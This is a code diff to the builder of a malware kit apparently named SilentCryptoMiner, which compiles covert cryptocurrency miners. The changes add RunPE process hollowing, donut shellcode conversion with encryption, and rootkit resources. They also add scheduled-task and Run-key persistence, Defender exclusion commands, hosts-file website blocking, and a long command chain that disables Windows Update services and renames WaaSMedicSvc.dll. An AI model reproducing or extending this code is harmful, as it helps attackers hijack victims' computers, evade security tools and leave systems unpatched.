@@ -24,14 +24,11 @@ namespace SilentCryptoMiner
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
 
+            File.WriteAllBytes(savePath + ".manifest", requireAdministrator ? Properties.Resources.administrator : Properties.Resources.user);
+            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
+
             if (!F.toggleShellcode.Checked)
             {
-                if (requireAdministrator)
-                {
-                    File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
-                    OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
-                }
-
                 if (!string.IsNullOrEmpty(iconPath))
                 {
                     OP += " /win32icon:\"" + iconPath + "\"";
@@ -66,10 +63,11 @@ namespace SilentCryptoMiner
                 {
                     R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata));
                 }
-                if (F.toggleRootkit.Checked)
+                if (F.FormAO.toggleRootkit.Checked)
                 {
                     R.AddResource(F.Resources_rootkiti, F.AES_Encryptor(Properties.Resources.rootkit_i));
                 }
+                R.AddResource(F.Resources_runpe, F.AES_Encryptor(Properties.Resources.RunPE));
 
                 R.Generate();
             }
@@ -96,7 +94,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -110,11 +108,9 @@ namespace SilentCryptoMiner
             var CodeProvider = new CSharpCodeProvider(providerOptions);
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
-            if (requireAdministrator)
-            {
-                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
-                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
-            }
+
+            File.WriteAllBytes(savePath + ".manifest", requireAdministrator ? Properties.Resources.administrator : Properties.Resources.user);
+            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
             parameters.OutputAssembly = savePath;
@@ -123,7 +119,7 @@ namespace SilentCryptoMiner
 
             parameters.ReferencedAssemblies.Add("System.dll");
             parameters.ReferencedAssemblies.Add("System.Management.dll");
-            if (F.toggleDebug.Checked)
+            if (F.FormAO.toggleDebug.Checked)
             {
                 parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             }
@@ -147,7 +143,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -161,11 +157,9 @@ namespace SilentCryptoMiner
             var codeProvider = new CSharpCodeProvider(providerOptions);
             var parameters = new CompilerParameters();
             string OP = " /target:exe /platform:x64 /optimize ";
-            if (F.toggleAdministrator.Checked)
-            {
-                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
-                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
-            }
+
+            File.WriteAllBytes(savePath + ".manifest", F.toggleAdministrator.Checked ? Properties.Resources.administrator : Properties.Resources.user);
+            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
             parameters.OutputAssembly = savePath;
@@ -175,7 +169,7 @@ namespace SilentCryptoMiner
             parameters.ReferencedAssemblies.Add("System.Management.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
-            if (F.toggleDebug.Checked)
+            if (F.FormAO.toggleDebug.Checked)
             {
                 parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             }
@@ -199,7 +193,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -213,11 +207,9 @@ namespace SilentCryptoMiner
             var codeProvider = new CSharpCodeProvider(providerOptions);
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
-            if (F.toggleAdministrator.Checked)
-            {
-                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
-                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
-            }
+
+            File.WriteAllBytes(savePath + ".manifest", F.toggleAdministrator.Checked ? Properties.Resources.administrator : Properties.Resources.user);
+            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
             parameters.OutputAssembly = savePath;
@@ -227,16 +219,17 @@ namespace SilentCryptoMiner
             parameters.ReferencedAssemblies.Add("System.Management.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
-            if (F.toggleDebug.Checked)
+            if (F.FormAO.toggleDebug.Checked)
             {
                 parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 using (var R = new System.Resources.ResourceWriter(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources"))
                 {
                     R.AddResource(F.Resources_rootkitu, F.AES_Encryptor(Properties.Resources.rootkit_u));
+                    R.AddResource(F.Resources_runpe, F.AES_Encryptor(Properties.Resources.RunPE));
                     R.Generate();
                 }
 
@@ -263,7 +256,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -277,9 +270,7 @@ namespace SilentCryptoMiner
                 string currentDirectory = Path.GetDirectoryName(savePath);
                 string filename = Path.GetFileNameWithoutExtension(savePath);
                 var paths = new Dictionary<string, string>() { 
-                    { "current", currentDirectory }, 
-                    { "includes", Path.Combine(currentDirectory, "Includes") }, 
-                    { "compilers", Path.Combine(currentDirectory, "Compilers") }, 
+                    { "current", currentDirectory },
                     { "compilerslog", Path.Combine(currentDirectory, @"Compilers\logs") }, 
                     { "windres", Path.Combine(currentDirectory, @"Compilers\MinGW64\bin\windres.exe") }, 
                     { "tcc", Path.Combine(currentDirectory, @"Compilers\tinycc\tcc.exe") }, 
@@ -289,29 +280,16 @@ namespace SilentCryptoMiner
                     { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") }, 
                     { "manifest", Path.Combine(currentDirectory, "administrator.manifest") }, 
                     { "resource.rc", Path.Combine(currentDirectory, "resource.rc") }, 
-                    { "resource.o", Path.Combine(currentDirectory, "resource.o") }, 
-                    { "loader", Path.Combine(currentDirectory, "loader.bin") }, 
+                    { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                     { "filename", Path.Combine(currentDirectory, filename) } };
+
+                ExtractExternalFiles(currentDirectory);
+
                 var directoryFilter = F.CheckNonASCII(savePath);
                 if (F.BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
                     return false;
                 if (F.BuildErrorTest(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
                     return false;
-                if (!Directory.Exists(paths["compilers"]))
-                {
-                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
-                    {
-                        archive.ExtractToDirectory(paths["compilers"]);
-                    }
-                }
-
-                if (!Directory.Exists(paths["includes"]))
-                {
-                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Includes)))
-                    {
-                        archive.ExtractToDirectory(paths["includes"]);
-                    }
-                }
 
                 var sb = new StringBuilder(Properties.Resources.Loader);
                 bool buildResource = !string.IsNullOrEmpty(icoPath) || requireAdministrator || AssemblyData;
@@ -354,8 +332,7 @@ namespace SilentCryptoMiner
                         return false;
                 }
 
-                RunExternalProgram(paths["donut"], string.Format("\"{0}\" -a 2 -f 1", inputFile), currentDirectory, paths["donutlog"]);
-                string shellcodebytes = File.ReadAllText(paths["loader"], Encoding.GetEncoding("ISO-8859-1"));
+                string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
                 string shellcode = ToLiteral(Cipher(shellcodebytes, F.KEY));
 
                 sb.Replace("startDelay", F.txtStartDelay.Text);
@@ -364,24 +341,18 @@ namespace SilentCryptoMiner
                 sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length.ToString());
                 sb.Replace("#SHELLCODE", shellcode);
                 sb.Replace("#ARGS", args);
-                CipherReplace(sb, "#ENV", "SystemRoot");
-                CipherReplace(sb, "#TARGET", F.toggleRootkit.Checked ? "System32\\dialer.exe" : "System32\\conhost.exe");
+                CipherReplace(sb, "#TARGET", "System32\\conhost.exe");
                 CipherReplace(sb, "#FORMAT1", @"%s\%s");
                 CipherReplace(sb, "#FORMAT2", "\"%s\" \"%s\"");
-                if (F.toggleKillWD.Checked)
-                {
-                    sb.Replace("DefKillWD", "TRUE");
-                    CipherReplace(sb, "#KILLWD", F.killWDCommands);
-                }
+                
                 File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
                 RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".c");
-                File.Delete(paths["loader"]);
                 if (F.BuildErrorTest(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
                     return false;
 
-                if (F.toggleRootkit.Checked)
+                if (F.FormAO.toggleRootkit.Checked)
                 {
                     MakeRootkitHelper(savePath);
                 }
@@ -392,6 +363,45 @@ namespace SilentCryptoMiner
                 return false;
             }
             return true;
+        }
+
+        public static void ExtractExternalFiles(string currentDirectory)
+        {
+            var paths = new Dictionary<string, string>() {
+                    { "includes", Path.Combine(currentDirectory, "Includes") },
+                    { "compilers", Path.Combine(currentDirectory, "Compilers") } };
+
+            if (!Directory.Exists(paths["compilers"]))
+            {
+                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
+                {
+                    archive.ExtractToDirectory(paths["compilers"]);
+                }
+            }
+
+            if (!Directory.Exists(paths["includes"]))
+            {
+                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Includes)))
+                {
+                    archive.ExtractToDirectory(paths["includes"]);
+                }
+            }
+        }
+
+        public static byte[] ConvertToShellcode(string filepath)
+        {
+            string currentDirectory = Path.GetDirectoryName(filepath);
+            var paths = new Dictionary<string, string>() {
+                    { "donut", Path.Combine(currentDirectory, @"Compilers\donut\donut.exe") },
+                    { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") },
+                    { "loader", Path.Combine(currentDirectory, "loader.bin") }};
+
+            ExtractExternalFiles(currentDirectory);
+
+            RunExternalProgram(paths["donut"], string.Format("\"{0}\" -a 2 -f 1", filepath), currentDirectory, paths["donutlog"]);
+            byte[] loader = File.ReadAllBytes(paths["loader"]);
+            File.Delete(paths["loader"]);
+            return loader;
         }
 
         public static void MakeRootkitHelper(string savePath)
@@ -480,18 +490,18 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefETH", "true");
             }
 
-            if (F.toggleKillWD.Checked)
+            if (F.toggleWDExclusions.Checked)
             {
-                stringb.Replace("DefKillWD", "true");
-                stringb.Replace("#KillWDCommands", F.EncryptString(F.killWDCommands));
+                stringb.Replace("DefWDExclusions", "true");
+                stringb.Replace("#DefenderCommands", F.EncryptString(F.defenderCommands));
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 stringb.Replace("DefRootkit", "true");
             }
 
-            if (F.toggleDebug.Checked)
+            if (F.FormAO.toggleDebug.Checked)
             {
                 stringb.Replace("DefDebug", "true");
             }
@@ -501,7 +511,12 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefDisableSleep", "true");
             }
 
-            if (F.chkBlockWebsites.Checked)
+            if (F.toggleWindowsUpdate.Checked)
+            {
+                stringb.Replace("DefDisableWindowsUpdate", "true");
+            }
+
+            if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
             {
                 stringb.Replace("DefBlockWebsites", "true");
                 stringb.Replace("DOMAINSET", $"\"{string.Join("\", \"", F.txtBlockWebsites.Text.Split(','))}\"");
@@ -557,11 +572,20 @@ namespace SilentCryptoMiner
                 if (F.toggleWatchdog.Checked)
                 {
                     stringb.Replace("DefWatchdog", "true");
+                    if (F.FormAO.toggleMemoryWatchdog.Checked)
+                    {
+                        stringb.Replace("DefMemoryWatchdog", "true");
+                    }
                 }
 
                 if (F.toggleAutoDelete.Checked)
                 {
                     stringb.Replace("DefAutoDelete", "true");
+                }
+
+                if (F.FormAO.toggleMinerOverwrite.Checked)
+                {
+                    stringb.Replace("DefMinerOverwrite", "true");
                 }
             }
 
@@ -585,10 +609,13 @@ namespace SilentCryptoMiner
             stringb.Replace("#WATCHDOGID", F.EncryptString($"\"{F.watchdogID}\""));
             stringb.Replace("#XID", F.EncryptString(F.xid));
             stringb.Replace("#EID", F.EncryptString(F.eid));
-            stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"));
-            stringb.Replace("#TASKSCH", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
-            stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /F /D \"{{0}}\""));
+            stringb.Replace("#WATCHDOGNAME", F.EncryptString("sihost64"));
+            stringb.Replace("#TASKSCHADD", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
+            stringb.Replace("#TASKSCHREM", F.EncryptString($"cmd /c schtasks /delete /f /tn \"{F.txtInstallEntryName.Text}\""));
+            stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"{{0}}\""));
+            stringb.Replace("#REGREM", F.EncryptString($"cmd /c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f"));
             stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
+            stringb.Replace("#WUPDATE", F.EncryptString(@"cmd /c sc stop wuauserv & sc stop bits & sc stop dosvc & sc stop UsoSvc & sc stop WaaSMedicSvc & sc config wuauserv start= disabled & sc failure wuauserv reset= 0 actions= """" & sc config bits start= disabled & sc failure bits reset= 0 actions= """" & sc config dosvc start= disabled & sc failure dosvc reset= 0 actions= """" & sc config UsoSvc start= disabled & sc failure UsoSvc reset= 0 actions= """" & sc config wuauserv start= disabled & sc failure wuauserv reset= 0 actions= """" & takeown /f C:\\Windows\\System32\\WaaSMedicSvc.dll & icacls C:\\Windows\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename C:\\Windows\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"" /v Start /t REG_DWORD /d 4 /f & reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"" /v FailureActions /t REG_BINARY /d 000000000000000000000000030000001400000000000000c0d4010000000000e09304000000000000000000 /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\sih"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\sihboot"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun"" /DISABLE"));
             stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
             stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"));
             stringb.Replace("#MINERID", F.EncryptString(F.minerFind));
@@ -597,9 +624,11 @@ namespace SilentCryptoMiner
             stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID \"{0}\""));
             stringb.Replace("#CMDDELETE", F.EncryptString("cmd /c choice /C Y /N /D Y /T 3 & Del \"{0}\""));
             stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
-            stringb.Replace("#DIALER", F.EncryptString("System32\\dialer.exe"));
+            stringb.Replace("#CONHOST", F.EncryptString("System32\\conhost.exe"));
             stringb.Replace("#HOSTSPATH", F.EncryptString("drivers/etc/hosts"));
             stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n127.0.0.1       {0}"));
+            stringb.Replace("#RUNPETYPE", F.EncryptString("RunPE.RunPE"));
+            stringb.Replace("#RUNPEMETHOD", F.EncryptString("Run"));
 
             stringb.Replace("#KEY", F.AESKEY);
             stringb.Replace("#SALT", F.SALT);
@@ -615,7 +644,8 @@ namespace SilentCryptoMiner
             stringb.Replace("#RESRKI", F.Resources_rootkiti);
             stringb.Replace("#RESRKU", F.Resources_rootkitu);
             stringb.Replace("#RESWR", F.Resources_winring);
-
+            stringb.Replace("#RESRPE", F.Resources_runpe);
+            
             stringb.Replace("startDelay", F.txtStartDelay.Text);
 
             foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
